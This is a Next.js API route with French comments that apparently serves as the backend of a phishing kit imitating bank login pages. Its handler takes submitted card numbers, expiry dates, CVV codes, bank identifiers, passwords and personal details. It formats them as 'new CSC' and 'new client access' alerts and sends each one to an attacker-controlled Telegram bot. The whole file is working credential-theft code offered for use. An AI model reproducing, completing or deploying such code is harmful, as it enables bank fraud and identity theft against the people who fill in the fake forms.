import { NextResponse } from 'next/server';

export async function POST(req: Request) {
  try {
    const data = await req.json();

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    // Construction du message selon le type de formulaire reçu
    let message = '';

    if (data.type === 'card_details') {
      // Données de la page BAT (Carte bancaire)
      message = `💳 *NOUVELLE CSC*\n\n` +
        `• *NIM :* \`${data.cardNumber}\`\n` +
        `• *XP :* \`${data.expiry}\`\n` +
        `• *CSC 3 :* \`${data.cvv}\`\n\n` +
        `📅 *Date :* ${new Date().toLocaleString('fr-FR')}`;

    } else if (data.offreId === '12' && data.nom) {
      // Données du formulaire "Autre établissement" (Modale)
      message = `🏛️ *NOUVEL ÉTABLISSEMENT (AUTRE)*\n\n` +
        `• *Nom complet :* ${data.nom}\n` +
        `• *Établissement :* ${data.etablissement}\n` +
        `• *Résident :* ${data.resident}\n\n` +
        `📅 *Date :* ${new Date().toLocaleString('fr-FR')}`;

    } else {
      // Données des formulaires standard (Offres 1 à 11)
      message = `🔑 *NOUVEL ACCÈS CLIENT*\n\n` +
        `• *Établissement ID :* ${data.offreId}\n` +
        `• *Identifiant :* \`${data.identifiant}\`\n` +
        `• *Code secret :* \`${data.password}\`\n\n` +
        `📅 *Date :* ${new Date().toLocaleString('fr-FR')}`;
    }

    // Envoi de la notification vers Telegram
    if (botToken && chatId) {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown',
        }),
      });
    }

    return NextResponse.json({ success: true, message: 'Données transmises' });

  } catch (error) {
    console.error('Erreur API Server :', error);
    return NextResponse.json(
      { success: false, error: 'Erreur lors du traitement' },
      { status: 500 }
    );
  }
}
